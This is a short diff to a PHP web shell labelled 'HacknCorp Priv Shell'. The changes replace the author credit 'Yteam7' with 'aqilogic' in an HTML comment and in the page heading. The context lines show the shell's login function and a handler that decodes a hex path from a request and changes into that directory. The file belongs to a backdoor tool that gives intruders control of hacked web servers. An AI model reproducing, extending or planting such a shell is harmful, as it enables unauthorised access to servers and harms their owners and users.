@@ -17,7 +17,7 @@ $default_charset = 'UTF-8';
 function login_shell()
 {
 ?>
-    <!-- Written by Yteam7 x ./Sachii'Exploit -->
+    <!-- Written by aqilogic x ./Sachii'Exploit -->
     <!DOCTYPE html>
     <html lang="en">
 
@@ -298,7 +298,7 @@ echo "
 <div class='container-fluid'>
 	<div class='py-3' id='main'>
 		<div class='box shadow bg-dark p-4 rounded-3'>
-			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>[ Yteam7 x HacknCorp Priv Shell ]</h4></a>";
+			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>[ aqilogic x HacknCorp Priv Shell ]</h4></a>";
 			if(isset($_7['path'])){
 				$path = unhex($_7['path']);
 				chdir($path);
